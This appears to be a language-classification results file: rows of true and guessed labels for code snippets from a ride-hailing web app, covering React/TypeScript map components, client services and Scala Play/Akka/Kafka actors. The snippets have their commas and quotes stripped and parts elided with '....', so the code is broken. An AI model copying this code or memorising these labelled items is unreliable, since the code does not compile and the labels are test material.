correct,guess,snippet
React,react,"import * as React from react;import * as ReactDOM from react-dom;import * as _ from lodash;import Measure from 'react-measure'import { OkDialog } from ./components/OkDialog;import 'bootstrap/dist/css/bootstrap.css';import {    Well    Grid    Row    Col    ButtonInput    ButtonGroup    Button} from react-bootstrap;import { AuthService } from ./services/AuthService;import { JobService } from ./services/JobService;import { PositionService } from ./services/PositionService;import { UUIDService } from ./services/UUIDService;import { Position } from ./domain/Position;import { hashHistory } from 'react-router';import { withGoogleMap GoogleMap Marker InfoBox OverlayView } from react-google-maps;const STYLES = {    overlayView: {        background: `white`        border: `1px solid #ccc`        padding: 15    }    icon: {        marginTop: 5        marginBottom: 5        marginLeft: 20    }}const GetPixelPositionOffset = (width height) => {    return { x: -(width / 2) y: -(height / 2) };}const CreateJobGoogleMap = withGoogleMap(props => (    <GoogleMap        ref={props.onMapLoad}        defaultZoom={16}        defaultCenter={{ lat: 50.8202949 lng: -0.1406958 }}        onClick={props.onMapClick}>        <OverlayView            key='createJobKey'            mapPaneName={OverlayView.OVERLAY_MOUSE_TARGET}            position={props.currentPosition}            getPixelPositionOffset={GetPixelPositionOffset}>            <div style={STYLES.overlayView}>                <img style={STYLES.icon}                    src='/assets/images/passenger.png' />                <br />                <Button                    type='button'                    bsSize='xsmall'                    bsStyle='primary'                    onClick={() => props.onCreateJobClick()}                    disabled={props.hasIssuedJob}                    value='Create Job'>Create Job</Button>            </div>        </OverlayView>    </GoogleMap>));export interface CreateJobState {    currentPosition: Position;    dimensions: {        width: number        height: number    };    hasIssuedJob: boolean;    okDialogOpen: boolean;    okDialogKey: number;    okDialogHeaderText: string;    okDialogBodyText: string;    wasSuccessful: boolean;}export class CreateJob extends React.Component<undefined CreateJobState> {    private _authService: AuthService;    private _jobService: JobService;    private _positionService: PositionService;    constructor(props: any) {        super(props);        this._jobService = props.route.jobService;        this._authService = props.route.authService;        this._positionService = props.route.positionService;        console.log(this._authService.userName());        console.log(this._authService.userEmail());        console.log(CreateJob ctor);        console.log(this._jobService);        if (!this._authService.isAuthenticated()) {            hashHistory.push('/');        }        if (this._authService.isDriver()) {            hashHistory.push('/viewjob');        }        this.state = {            currentPosition: new Position(50.8202949 -0.1406958)            dimensions: { width: -1 height: -1 }            hasIssuedJob: this._jobService.hasIssuedJob()            okDialogHeaderText: ''            okDialogBodyText: ''            okDialogOpen: false            okDialogKey: 0            wasSuccessful: false        };    }    render() {        const adjustedwidth = this.state.dimensions.width;        return (            <Well className=outer-well>                <Grid>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <h4>SET YOUR CURRENT LOCATION</h4>                            <h6>Click the map to set your current location</h6>                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <Measure                                bounds                                onResize={(contentRect) => {                                    this.setState({ dimensions: contentRect.bounds })                                }}                            >                                {({ measureRef }) =>                                    <div ref={measureRef}>                                        <CreateJobGoogleMap                                            containerElement={                                                <div style={{                                                    position: 'relative'                                                    top: 0                                                    left: 0                                                    right: 0                                                    bottom: 0                                                    justifyContent: 'flex-end'                                                    alignItems: 'center'                                                    width: { adjustedwidth }                                                    height: 600                                                    marginTop: 20                                                    marginLeft: 0                                                    marginRight: 0                                                    marginBottom: 20                                                }} />                                            }                                            mapElement={                                                <div style={{                                                    position: 'relative'                                                    top: 0                                                    left: 0                                                    right: 0                                                    bottom: 0                                                    width: { adjustedwidth }                                                    height: 600                                                    marginTop: 20                                                    marginLeft: 0                                                    marginRight: 0                                                    marginBottom: 20                                                }} />                                            }                                            onMapLoad={this.handleMapLoad}                                            onMapClick={this.handleMapClick}                                            currentPosition={this.state.currentPosition}                                            onCreateJobClick={this.handleCreateJobClick}                                            hasIssuedJob={this.state.hasIssuedJob}                                        />                                    </div>                                }                            </Measure>                        </Col>                    </Row>                    <Row className=show-grid>                        <span>                            <OkDialog                                open={this.state.okDialogOpen}                                okCallBack={this.okDialogCallBack}                                headerText={this.state.okDialogHeaderText}                                bodyText={this.state.okDialogBodyText}                                key={this.state.okDialogKey} />                        </span>                    </Row>                </Grid>            </Well>        );    }    handleCreateJobClick = () => {        var self = this;        var currentUser = this._authService.user();        var newJob = {            jobUUID: UUIDService.createUUID()            clientFullName: currentUser.fullName            clientEmail: currentUser.email            clientPosition: {                latitude: self.state.currentPosition.latitude                longitude: self.state.currentPosition.longitude            }            driverFullName: ''            driverEmail: ''            vehicleDescription: ''            vehicleRegistrationNumber: ''            isAssigned: false            isCompleted: false        }        $.ajax({            type: 'POST'            url: 'job/submit'            data: JSON.stringify(newJob)            contentType: application/json; charset=utf-8            dataType: 'json'        })        .done(function (jdata textStatus jqXHR) {            self._jobService.storeUserIssuedJob(newJob);            const newState = Object.assign({} self.state {                hasIssuedJob: self._jobService.hasIssuedJob()            });            self.setState(newState)            self._positionService.storeUserPosition(self.state.currentPosition);            hashHistory.push('/viewjob');        })        .fail(function (jqXHR textStatus errorThrown) {            const newState = Object.assign({} self.state {                okDialogHeaderText: 'Error'                okDialogBodyText: jqXHR.responseText                okDialogOpen: true                okDialogKey: Math.random()            })            self.setState(newState)        });    }    okDialogCallBack = () => {        this.setState(            {                okDialogOpen: false            });    }    handleMapLoad = (map) => {        if (map) {            console.log(map.getZoom());        }    }    handleMapClick = (event) => {        const newState = Object.assign({} this.state {            currentPosition: new Position(event.latLng.lat() event.latLng.lng())        })        this.setState(newState)    }}"
JavaScript,javascript,"export class Position {    //my JSON API prefers nice names    latitude: number;    longitude: number;    //map component wants these abbreviated names    lat: number;    lng: number;    constructor(latitude: number longitude: number) {        this.latitude = latitude;        this.longitude = longitude;        //keep map happy        this.lat = latitude;        this.lng = longitude;    }   }"
JavaScript,javascript,"import { injectable inject } from inversify;import { Position } from ../domain/Position;import { PositionMarker } from ../domain/PositionMarker;import { TYPES } from ../../src/types;import { AuthService } from ./AuthService;@injectable()export class PositionService {    private _authService: AuthService;    constructor( @inject(TYPES.AuthService) authService: AuthService) {        this._authService = authService;    }    clearUserJobPositions = (): void => {        let keyCurrentUserJobPositions = 'currentUserJobPositions_' + this._authService.userEmail();        sessionStorage.removeItem(keyCurrentUserJobPositions);    }    storeUserJobPositions = (jobPositions: Array<PositionMarker>): void => {        if (jobPositions == null || jobPositions == undefined)            return;        let currentUsersJobPositions = {            currentUser: this._authService.user()            jobPositions: jobPositions        }        let keyCurrentUserJobPositions = 'currentUserJobPositions_' + this._authService.userEmail();        sessionStorage.setItem(keyCurrentUserJobPositions JSON.stringify(currentUsersJobPositions));    }    userJobPositions = (): Array<PositionMarker> => {        let keyCurrentUserJobPositions = 'currentUserJobPositions_' + this._authService.userEmail();        var currentUserJobPositions = JSON.parse(sessionStorage.getItem(keyCurrentUserJobPositions));        return currentUserJobPositions.jobPositions;    }    hasJobPositions = (): boolean => {        let keyCurrentUserJobPositions = 'currentUserJobPositions_' + this._authService.userEmail();        var currentUserJobPositions = JSON.parse(sessionStorage.getItem(keyCurrentUserJobPositions));        return currentUserJobPositions != null && currentUserJobPositions != undefined;    }    clearUserPosition = (): void => {        let keyCurrentUserPosition = 'currentUserPosition_' + this._authService.userEmail();        sessionStorage.removeItem(keyCurrentUserPosition);    }    storeUserPosition = (position: Position): void => {        if (position == null || position == undefined)            return;        let currentUsersPosition = {            currentUser: this._authService.user()            position: position        }        let keyCurrentUserPosition = 'currentUserPosition_' + this._authService.userEmail();        sessionStorage.setItem(keyCurrentUserPosition JSON.stringify(currentUsersPosition));    }    currentPosition = (): Position => {        let keyCurrentUserPosition = 'currentUserPosition_' + this._authService.userEmail();        var currentUsersPosition = JSON.parse(sessionStorage.getItem(keyCurrentUserPosition));        return currentUsersPosition.position;    }    hasPosition = (): boolean => {        let keyCurrentUserPosition = 'currentUserPosition_' + this._authService.userEmail();        var currentUsersPosition = JSON.parse(sessionStorage.getItem(keyCurrentUserPosition));        return currentUsersPosition != null && currentUsersPosition != undefined;    }}"
Scala,scala,"package controllersimport javax.inject.Injectimport entities.Jobimport entities.JobJsonFormatters._import entities._import actors.job.{JobConsumerActor JobProducerActor}import akka.actor.{ActorSystem OneForOneStrategy Props SupervisorStrategy}import akka.pattern.{Backoff BackoffSupervisor}import akka.stream.scaladsl.{BroadcastHub Keep MergeHub}import akka.stream.{ActorMaterializer ActorMaterializerSettings Supervision}import play.api.http.ContentTypesimport play.api.libs.Cometimport play.api.libs.json._import play.api.libs.json.Jsonimport play.api.libs.json.Formatimport play.api.libs.json.JsSuccessimport play.api.libs.json.Writesimport play.api.mvc.{Action Controller}import utils.Errorsimport scala.concurrent.{ExecutionContext Future}import scala.util.Randomimport scala.concurrent.duration._class JobController @Inject()(  implicit actorSystem: ActorSystem  ec: ExecutionContext) extends Controller{  val rand = new Random()  //Error handling for streams  //http://doc.akka.io/docs/akka/2.5.2/scala/stream/stream-error.html  val decider: Supervision.Decider = {    case _ => Supervision.Restart  }  implicit val mat = ActorMaterializer(    ActorMaterializerSettings(actorSystem).withSupervisionStrategy(decider))  val (sink source) =    MergeHub.source[JsValue](perProducerBufferSize = 16)      .toMat(BroadcastHub.sink(bufferSize = 256))(Keep.both)      .run()  //job producer  val childJobProducerActorProps = Props(classOf[JobProducerActor]matec)  val jobProducerSupervisorProps = createBackoffSupervisor(childJobProducerActorProps    sJobProducerActor_${rand.nextInt()})  val jobProducerSupervisorActorRef = actorSystem.actorOf(jobProducerSupervisorProps    name = jobProducerSupervisor)  //job consumer  val childJobConsumerActorProps = Props(new JobConsumerActor(sink)(matec))  val jobConsumerSupervisorProps = createBackoffSupervisor(childJobConsumerActorProps    sJobConsumerActor_${rand.nextInt()})  val jobConsumerSupervisorActorRef = actorSystem.actorOf(jobConsumerSupervisorProps    name = jobConsumerSupervisor)  jobConsumerSupervisorActorRef ! Init  def streamedJob() = Action {    Ok.chunked(source via Comet.json(parent.jobChanged)).as(ContentTypes.HTML)  }  def submitJob = Action.async(parse.json) { request =>    Json.fromJson[Job](request.body) match {      case JsSuccess(job _) => {        jobProducerSupervisorActorRef ! job        Future.successful(Ok(Json.toJson(job.copy(clientEmail = job.clientEmail.toUpperCase))))      }      case JsError(errors) =>        Future.successful(BadRequest(Could not build a Job from the json provided.  +          Errors.show(errors)))    }  }  private def createBackoffSupervisor(childProps:Props actorChildName: String) : Props = {    BackoffSupervisor.props(      Backoff.onStop(        childProps        childName = actorChildName        minBackoff = 3.seconds        maxBackoff = 30.seconds        randomFactor = 0.2      ).withSupervisorStrategy(        OneForOneStrategy() {          case _ => SupervisorStrategy.Restart        })    )  }}"
Scala,javascript,"val (sink source) =    MergeHub.source[JsValue](perProducerBufferSize = 16)      .toMat(BroadcastHub.sink(bufferSize = 256))(Keep.both)      .run()	  ................	  	  def streamedJob() = Action {    Ok.chunked(source via Comet.json(parent.jobChanged)).as(ContentTypes.HTML)  }	  "
Scala,scala,"ackage actors.jobimport kafka.topics.JobTopicsimport serialization.JSONSerdeimport akka.Doneimport akka.actor.{Actor PoisonPill}import akka.kafka.ProducerSettingsimport akka.kafka.scaladsl.Producerimport akka.stream.scaladsl.{Keep MergeHub Source}import akka.stream.{ActorMaterializer KillSwitches}import entities.Jobimport org.apache.kafka.clients.producer.ProducerRecordimport org.apache.kafka.common.serialization.{ByteArraySerializer StringSerializer}import utils.Settingsimport scala.concurrent.ExecutionContextimport scala.util.{Failure Success}class JobProducerActor(  implicit materializer: ActorMaterializer  ec: ExecutionContext) extends Actor {  val jSONSerde = new JSONSerde[Job]  val jobProducerSettings = ProducerSettings(    context.system    new StringSerializer    new ByteArraySerializer)    .withBootstrapServers(s${Settings.bootStrapServers})  val ((mergeHubSink killswitch) kafkaSourceFuture) =    MergeHub.source[Job](perProducerBufferSize = 16)      .map(job => {        val jobBytes = jSONSerde.serializer().serialize( job)        (job jobBytes)      })      .map { jobWithBytes =>        val (job jobBytes) = jobWithBytes        new ProducerRecord[String Array[Byte]](          JobTopics.JOB_SUBMIT_TOPIC job.clientEmail jobBytes)      }      .viaMat(KillSwitches.single)(Keep.both)      .toMat(Producer.plainSink(jobProducerSettings))(Keep.both)      .run()  kafkaSourceFuture.onComplete {    case Success(value) => println(sGot the callback value = $value)    case Failure(e) => {      self ! PoisonPill    }  }  override def postStop(): Unit = {    super.postStop()    println(sJobProducerActor seen 'Done')    killswitch.shutdown()  }  override def receive: Receive = {    case (job: Job) => {      println(sJobProducerActor seen ${job})      Source.single(job).runWith(mergeHubSink)    }    case Done => {      println(sJobProducerActor seen 'Done')      killswitch.shutdown()      self ! PoisonPill    }  }}"
Scala,scala,"package actors.jobimport entities.{Job Init}import kafka.topics.JobTopicsimport serialization.JSONSerdeimport akka.{Done NotUsed}import akka.actor.{Actor ActorSystem PoisonPill}import akka.kafka.{ConsumerSettings ProducerSettings Subscriptions}import akka.kafka.scaladsl.{Consumer Producer}import akka.stream.scaladsl.{Keep MergeHub Sink Source}import akka.stream.{ActorMaterializer KillSwitches}import org.apache.kafka.clients.consumer.ConsumerConfigimport org.apache.kafka.clients.producer.ProducerRecordimport org.apache.kafka.common.serialization.{ByteArrayDeserializer ByteArraySerializer StringDeserializer StringSerializer}import play.api.libs.json.{JsValue Json}import utils.Settingsimport scala.concurrent.ExecutionContextimport scala.util.{Failure Success}//TODO : This actor shouls take in a way of pushing back to Websocketclass JobConsumerActor  (val sink:Sink[JsValue NotUsed])  (implicit materializer: ActorMaterializer ec: ExecutionContext) extends Actor {  val jSONSerde = new JSONSerde[Job]  val jobConsumerSettings = ConsumerSettings(    context.systemnew StringDeserializer()new ByteArrayDeserializer())    .withBootstrapServers(s${Settings.bootStrapServers})    .withGroupId(group1)    .withProperty(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG earliest)  val ((_ killswitch) kafkaConsumerFuture) =    Consumer.committableSource(jobConsumerSettings Subscriptions.topics(JobTopics.JOB_SUBMIT_TOPIC))      .mapAsync(1) { msg => {        val jobBytes = msg.record.value        val job = jSONSerde.deserializer().deserialize(JobTopics.JOB_SUBMIT_TOPICjobBytes)        self ! job        msg.committableOffset.commitScaladsl()      }      }      .viaMat(KillSwitches.single)(Keep.both)      .toMat(Sink.last)(Keep.both)      .run()  kafkaConsumerFuture.onComplete {    case Success(value) => println(sGot the callback value = $value)    case Failure(e) => {      self ! PoisonPill    }  }  override def postStop(): Unit = {    super.postStop()    println(sJobConsumerActor seen 'Done')    killswitch.shutdown()  }  override def receive: Receive = {    case (job: Job) => {      println(sJobConsumerActor seen ${job})      val finalJsonValue = Json.toJson(job)      Source.single(finalJsonValue).runWith(sink)    }    case Done => {      println(sJobConsumerActor seen 'Done')      killswitch.shutdown()      self ! PoisonPill    }    case Init => {      println(JobConsumerActor saw init)    }  }}"
JavaScript,javascript,"import { injectable inject } from inversify;import { JobEventArgs } from ../domain/JobEventArgs;import Rx from 'rx';@injectable()export class JobStreamService {    private _jobSourceObservable: Rx.Observable<any>;    constructor() {    }    init = (): void => {        window['jobChanged'] = function (incomingJsonPayload: any) {            let evt = new CustomEvent('onJobChanged' new JobEventArgs(incomingJsonPayload));            window.dispatchEvent(evt);        }        this._jobSourceObservable = Rx.Observable.fromEvent(window 'onJobChanged');    }    getJobStream = (): Rx.Observable<any> => {        return this._jobSourceObservable;    }}"
JavaScript,javascript,"componentWillMount() {    this._subscription =        this._jobStreamService.getJobStream()        .subscribe(        jobArgs => {                console.log('RX saw onJobChanged');                console.log('RX x = ' jobArgs.detail);            }            error => {                console.log('RX saw ERROR');                console.log('RX error = ' error);            }            () => {                console.log('RX saw COMPLETE');            }        );}"
React,react,"import * as React from react;import * as ReactDOM from react-dom;import * as _ from lodash;import Measure from 'react-measure'import { RatingDialog } from ./components/RatingDialog;import { YesNoDialog } from ./components/YesNoDialog;import { OkDialog } from ./components/OkDialog;import { AcceptList } from ./components/AcceptList;import 'bootstrap/dist/css/bootstrap.css';import {    Well    Grid    Row    Col    ButtonInput    ButtonGroup    Button    Modal    Popover    Tooltip    OverlayTrigger} from react-bootstrap;import { AuthService } from ./services/AuthService;import { JobService } from ./services/JobService;import { JobStreamService } from ./services/JobStreamService;import { PositionService } from ./services/PositionService;import { Position } from ./domain/Position;import { PositionMarker } from ./domain/PositionMarker;import { hashHistory } from 'react-router';import { withGoogleMap GoogleMap Marker OverlayView } from react-google-maps;const STYLES = {    overlayView: {        background: `white`        border: `1px solid #ccc`        padding: 15    }}const GetPixelPositionOffset = (width height) => {    return { x: -(width / 2) y: -(height / 2) };}const ViewJobGoogleMap = withGoogleMap(props => (    <GoogleMap        ref={props.onMapLoad}        defaultZoom={16}        defaultCenter={{ lat: 50.8202949 lng: -0.1406958 }}        onClick={props.onMapClick}>        {props.markers.map((marker index) => (            <OverlayView                key={marker.key}                mapPaneName={OverlayView.OVERLAY_MOUSE_TARGET}                position={marker.position}                getPixelPositionOffset={GetPixelPositionOffset}>                <div style={STYLES.overlayView}>                    <img src={marker.icon} />                    <strong>{marker.key}</strong>                </div>            </OverlayView>        ))}    </GoogleMap>));export interface ViewJobState {    markers: Array<PositionMarker>;    okDialogOpen: boolean;    okDialogKey: number;    okDialogHeaderText: string;    okDialogBodyText: string;    dimensions: {        width: number        height: number    }    currentPosition: Position;    isJobAccepted: boolean;    finalActionHasBeenClicked: boolean;}type DoneCallback = (jdata: any textStatus: any jqXHR: any) => voidexport class ViewJob extends React.Component<undefined ViewJobState> {    private _authService: AuthService;    private _jobService: JobService;    private _jobStreamService: JobStreamService;    private _positionService: PositionService;    private _subscription: any;     private _currentJobUUID: any;    constructor(props: any) {        super(props);        this._authService = props.route.authService;        this._jobStreamService = props.route.jobStreamService;        this._jobService = props.route.jobService;        this._positionService = props.route.positionService;                if (!this._authService.isAuthenticated()) {            hashHistory.push('/');        }        let savedMarkers: Array<PositionMarker> = new Array<PositionMarker>();        if (this._positionService.hasJobPositions()) {            savedMarkers = this._positionService.userJobPositions();        }        this.state = {            markers: savedMarkers            okDialogHeaderText: ''            okDialogBodyText: ''            okDialogOpen: false            okDialogKey: 0            dimensions: { width: -1 height: -1 }            currentPosition: this._authService.isDriver() ? null :                this._positionService.currentPosition()            isJobAccepted: false            finalActionHasBeenClicked: false        };    }    componentWillMount() {        var self = this;        this._subscription =            this._jobStreamService.getJobStream()            .retry()            .where(function (x idx obs) {                return self.shouldShowMarkerForJob(x.detail);            })            .subscribe(                jobArgs => {                    console.log('RX saw onJobChanged');                    console.log('RX x = ' jobArgs.detail);                    this._jobService.clearUserIssuedJob();                    this._jobService.storeUserIssuedJob(jobArgs.detail);                    this.addMarkerForJob(jobArgs.detail);                }                error => {                    console.log('RX saw ERROR');                    console.log('RX error = ' error);                }                () => {                    console.log('RX saw COMPLETE');                }            );    }    componentWillUnmount() {        this._subscription.dispose();        this._positionService.storeUserJobPositions(this.state.markers);    }    render() {        const adjustedwidth = this.state.dimensions.width;        return (            <Well className=outer-well>                <Grid>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <h4>CURRENT JOB</h4>                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <AcceptList                                markers={_.filter(this.state.markers { isDriverIcon: true })}                                currentUserIsDriver={this._authService.isDriver()}                                clickCallback={this.handleMarkerClick}                            />                        </Col>                    </Row>                    <Row className=show-grid>                        <Col xs={10} md={6}>                            <Measure                                bounds                                onResize={(contentRect) => {                                    this.setState({ dimensions: contentRect.bounds })                                }}>                                {({ measureRef }) =>                                    <div ref={measureRef}>                                        <ViewJobGoogleMap                                            containerElement={                                                <div style={{                                                    position: 'relative'                                                    top: 0                                                    left: 0                                                    right: 0                                                    bottom: 0                                                    width: { adjustedwidth }                                                    height: 600                                                    justifyContent: 'flex-end'                                                    alignItems: 'center'                                                    marginTop: 20                                                    marginLeft: 0                                                    marginRight: 0                                                    marginBottom: 20                                                }} />                                            }                                            mapElement={                                                <div style={{                                                    position: 'relative'                                                    top: 0                                                    left: 0                                                    right: 0                                                    bottom: 0                                                    width: { adjustedwidth }                                                    height: 600                                                    marginTop: 20                                                    marginLeft: 0                                                    marginRight: 0                                                    marginBottom: 20                                                }} />                                            }                                            markers={this.state.markers}                                            onMapClick={this.handleMapClick}                                        />                                    </div>                                }                            </Measure>                        </Col>                    </Row>                    {this.state.isJobAccepted === true ?                        <Row className=show-grid>                            <span>                                <RatingDialog                                    theId=viewJobCompleteBtn                                    headerText=Rate your driver/passenger                                    okCallBack={this.ratingsDialogOkCallBack}                                    actionPerformed={this.state.finalActionHasBeenClicked} />                                {!(this._authService.isDriver() === true) ?                                    <YesNoDialog                                        theId=viewJobCancelBtn                                        launchButtonText=Cancel                                        actionPerformed={this.state.finalActionHasBeenClicked}                                         yesCallBack={this.jobCancelledCallBack}                                        noCallBack={this.jobNotCancelledCallBack}                                        headerText=Cancel the job />                                    :                                     null                                }                                <OkDialog                                    open={this.state.okDialogOpen}                                    okCallBack={this.okDialogCallBack}                                    headerText={this.state.okDialogHeaderText}                                    bodyText={this.state.okDialogBodyText}                                    key={this.state.okDialogKey} />                            </span>                        </Row> :                        null                    }                </Grid>            </Well>        );    }    handleMapClick = (event) => {        ....        ....        this._positionService.clearUserJobPositions();        this._positionService.storeUserJobPositions(this.state.markers);        this.pushOutJob(newPosition currentJob);    }    handleMarkerClick = (targetMarker) => {        console.log('button on AcceptList clicked:' + targetMarker.key);        console.log(targetMarker);        let currentJob = this._jobService.currentJob();        let jobForMarker = targetMarker.jobForMarker;        let clientMarker = _.find(this.state.markers { 'isDriverIcon': false });        if (clientMarker != undefined && clientMarker != null) {            let clientJob = clientMarker.jobForMarker;            clientJob.driverFullName = jobForMarker.driverFullName;            clientJob.driverEmail = jobForMarker.driverEmail;            clientJob.driverPosition = jobForMarker.driverPosition;            clientJob.vehicleDescription = jobForMarker.vehicleDescription;            clientJob.vehicleRegistrationNumber = jobForMarker.vehicleRegistrationNumber;            clientJob.isAssigned = true;                        let self = this;            console.log(handleMarkerClick job);            console.log(clientJob);            this.makePOSTRequest('job/submit' clientJob this                function (jdata textStatus jqXHR) {                    console.log(After is accepted);                    const newState = Object.assign({} self.state {                        isJobAccepted: true                    })                    self.setState(newState);                });        }    }    addMarkerForJob = (jobArgs: any): void => {        console.log(addMarkerForJob);        console.log(this.state);        if (this.state.isJobAccepted || jobArgs.isAssigned) {            this.processAcceptedMarkers(jobArgs);        }        else {            this.processNotAcceptedMarkers(jobArgs);        }    }    processAcceptedMarkers = (jobArgs: any): void => {        ....        ....    }    processNotAcceptedMarkers = (jobArgs: any): void => {        ....        ....    }    addClientDetailsToDrivers = (newMarkersList: PositionMarker[]): void => {        ....    }    updateStateForMarkers = (newState: any newMarkersList: PositionMarker[] newPositionForUser: Position jobArgs:any): void => {        //Update the list of position markers in the PositionService        this._positionService.clearUserJobPositions();        this._positionService.storeUserJobPositions(newMarkersList);        //Update the position in the PositionService        if (newPositionForUser != undefined && newPositionForUser != null) {            this._positionService.clearUserPosition();            this._positionService.storeUserPosition(newPositionForUser);        }        this._jobService.clearUserIssuedJob();        this._jobService.storeUserIssuedJob(jobArgs);        //update the state        this.setState(newState);    }    updateMatchedUserMarker = (jobEmailToCheck: string newMarkersList: PositionMarker[]        jobPosition: Position jobForMarker:any): void => {        if (jobEmailToCheck != undefined && jobEmailToCheck != null) {            let matchedMarker = _.find(this.state.markers { 'email': jobEmailToCheck });            if (matchedMarker != null) {                //update its position                matchedMarker.position = jobPosition;                matchedMarker.jobForMarker = jobForMarker;            }        }    }    updateStateForNewMarker = (newMarkersList:PositionMarker[] position: Position): any => {        if (position != null) {            return Object.assign({} this.state {                currentPosition: position                markers: newMarkersList            })        }        else {           return Object.assign({} this.state {                markers: newMarkersList            })        }    }    updateStateForAcceptedMarker = (newMarkersList: PositionMarker[] position: Position): any => {        if (position != null) {            return Object.assign({} this.state {                currentPosition: position                markers: newMarkersList                isJobAccepted: true            })        }        else {            return Object.assign({} this.state {                markers: newMarkersList                isJobAccepted: true            })        }    }    shouldShowMarkerForJob = (jobArgs: any): boolean => {        let isDriver = this._authService.isDriver();        let currentJob = this._jobService.currentJob();        let hasJob = currentJob != undefined && currentJob != null;        //case 1 - No job exists to allow driver to add their mark initially        if (!hasJob && isDriver)            return true;                //case 2 - Job exists and is unassigned and if there is no other active         //         job for this client/ driver        if (hasJob && !currentJob.isAssigned)            return true;        //case 3 - If the job isAssigned and its for the current logged in client/driver        if (hasJob && currentJob.isAssigned) {            if (currentJob.clientEmail == jobArgs.clientEmail) {                return true;            }            if (currentJob.driverEmail == jobArgs.driverEmail) {                return true;            }        }        return false;    }    pushOutJob = (newPosition: Position jobForMarker : any): void => {        ....        ....        ....        var newJob = {            jobUUID: this._currentJobUUID != undefined && this._currentJobUUID != '' ?                this._currentJobUUID : ''            clientFullName: localClientFullName            clientEmail: localClientEmail            clientPosition: localClientPosition            driverFullName: localDriverFullName            driverEmail: localDriverEmail            driverPosition: localDriverPosition            vehicleDescription: isDriver ?                this._authService.user().vehicleDescription : ''            vehicleRegistrationNumber: isDriver ?                this._authService.user().vehicleRegistrationNumber : ''            isAssigned: localIsAssigned            isCompleted: false        }        console.log(handlpushOutJob job);        console.log(newJob);        this.makePOSTRequest('job/submit' newJob self            function (jdata textStatus jqXHR) {                self._jobService.clearUserIssuedJob();                self._jobService.storeUserIssuedJob(newJob);            });    }    createDriverMarker = (        driver: any        event: any): PositionMarker => {        ....    }        ratingsDialogOkCallBack = (theRatingScore: number) => {        console.log('RATINGS OK CLICKED');       //POST rating data    }       makePOSTRequest = (route: string jsonData: any context: ViewJob doneCallback: DoneCallback) => {        //Post job data    }    ....    ....}"
